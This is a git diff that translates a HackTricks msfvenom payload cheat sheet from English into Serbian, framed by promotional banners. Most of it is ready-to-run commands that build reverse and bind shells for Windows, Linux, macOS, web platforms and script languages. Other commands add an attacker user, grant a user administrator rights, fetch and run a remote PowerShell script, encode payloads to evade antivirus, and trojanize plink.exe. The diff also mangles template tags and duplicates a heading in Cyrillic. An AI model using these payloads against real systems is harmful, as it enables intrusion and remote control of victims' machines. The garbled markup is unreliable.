@@ -2,58 +2,70 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hakerski uvidi**\
+Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Vesti u realnom vremenu o hakovanju**\
+Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Najnovije objave**\
+Ostanite informisani o najnovijim pokretanjima nagrada za pronalaženje bagova i važnim ažuriranjima platforme
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!
 
 ***
 
-## Basic msfvenom
+## Osnovni msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-One can also use the `-a` to specify the architecture or the `--platform`
+Takođe se može koristiti `-a` da se specificira arhitektura ili `--platform`
 
 ## Listing
-
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
+## Uobičajeni parametri prilikom kreiranja shellcode-a
 
-## Common params when creating a shellcode
+Prilikom kreiranja shellcode-a, postoje neki uobičajeni parametri koje treba uzeti u obzir. Ovi parametri omogućavaju prilagođavanje shellcode-a specifičnim potrebama i ciljevima.
 
+- **`-p`** ili **`--payload`**: Ovaj parametar se koristi za odabir odgovarajućeg payloada koji će biti uključen u shellcode. Na primer, možete odabrati reverse shell payload ili bind shell payload.
+
+- **`-f`** ili **`--format`**: Ovaj parametar se koristi za odabir formata izlaznog fajla. Na primer, možete odabrati da izlazni fajl bude u formatu `exe`, `elf`, `raw` ili `c`.
+
+- **`-e`** ili **`--encoder`**: Ovaj parametar se koristi za odabir enkodera koji će biti korišćen za enkodiranje shellcode-a. Enkoderi se koriste za izbegavanje detekcije antivirusnih programa. Na primer, možete odabrati enkoder poput `x86/shikata_ga_nai` ili `x86/jmp_call_additive`.
+
+- **`-b`** ili **`--bad-chars`**: Ovaj parametar se koristi za navođenje loših karaktera koje treba izbeći prilikom generisanja shellcode-a. Na primer, možete navesti loše karaktere kao što su NULL bajtovi ili newline karakteri.
+
+- **`-i`** ili **`--iterations`**: Ovaj parametar se koristi za navođenje broja iteracija koje će se koristiti prilikom enkodiranja shellcode-a. Veći broj iteracija može pomoći u izbegavanju detekcije antivirusnih programa, ali takođe može povećati veličinu shellcode-a.
+
+- **`-o`** ili **`--out`**: Ovaj parametar se koristi za navođenje putanje i naziva izlaznog fajla koji će sadržati generisani shellcode.
+
+Ovi parametri su samo neki od uobičajenih parametara koji se mogu koristiti prilikom kreiranja shellcode-a. Važno je prilagoditi parametre prema specifičnim potrebama i ciljevima napada.
 ```bash
--b "\x00\x0a\x0d" 
--f c 
--e x86/shikata_ga_nai -i 5 
+-b "\x00\x0a\x0d"
+-f c
+-e x86/shikata_ga_nai -i 5
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-
 ## **Windows**
 
 ### **Reverse Shell**
@@ -62,68 +74,54 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-{% endcode %}
-
 ### Bind Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
-{% endcode %}
-
-### Create User
+### Kreiranje korisnika
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-{% endcode %}
-
 ### CMD Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
 ```
-{% endcode %}
-
-### **Execute Command**
-
 {% code overflow="wrap" %}
+
+### **Izvrši komandu**
 ```bash
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
 {% endcode %}
 
-### Encoder
+### Enkoder
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-{% endcode %}
-
-### Embedded inside executable
+### Ugrađeno unutar izvršne datoteke
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-{% endcode %}
+{% code overflow="wrap" %}
 
-## Linux Payloads
+## Linux Payloadi
 
 ### Reverse Shell
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-{% endcode %}
-
 ### Bind Shell
 
 {% code overflow="wrap" %}
@@ -138,18 +136,16 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-{% endcode %}
+{% code overflow="wrap" %}
 
-## **MAC Payloads**
+## **MAC Payloadi**
 
 ### **Reverse Shell:**
 
-{% code overflow="wrap" %}
+{% endcode %}
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-{% endcode %}
-
 ### **Bind Shell**
 
 {% code overflow="wrap" %}
@@ -158,11 +154,11 @@ msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho
 ```
 {% endcode %}
 
-## **Web Based Payloads**
+## **Veb bazirani payloadi**
 
 ### **PHP**
 
-#### Reverse shel**l**
+#### Obrnuti šel
 
 {% code overflow="wrap" %}
 ```bash
@@ -200,15 +196,15 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f r
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
-{% endcode %}
+{% code %}
 
 ### NodeJS
 
+### НодеJS
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-
-## **Script Language payloads**
+## **Skript jezički payloadi**
 
 ### **Perl**
 
@@ -216,16 +212,14 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
-{% endcode %}
+{% code overflow="wrap" %}
 
 ### **Python**
 
-{% code overflow="wrap" %}
+{% endcode %}
 ```bash
 msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
 ```
-{% endcode %}
-
 ### **Bash**
 
 {% code overflow="wrap" %}
@@ -236,29 +230,29 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
+Pridružite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!
 
-**Hacking Insights**\
-Engage with content that delves into the thrill and challenges of hacking
+**Hakerski uvidi**\
+Uključite se u sadržaj koji istražuje uzbuđenje i izazove hakovanja
 
-**Real-Time Hack News**\
-Keep up-to-date with fast-paced hacking world through real-time news and insights
+**Vesti o hakovanju u realnom vremenu**\
+Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu
 
-**Latest Announcements**\
-Stay informed with the newest bug bounties launching and crucial platform updates
+**Najnovije objave**\
+Budite informisani o najnovijim pokretanjima nagrada za pronalaženje bagova i važnim ažuriranjima platforme
 
-**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
+**Pridružite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i počnite da sarađujete sa vrhunskim hakerima danas!
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Drugi načini podrške HackTricks-u:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Pogledajte [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
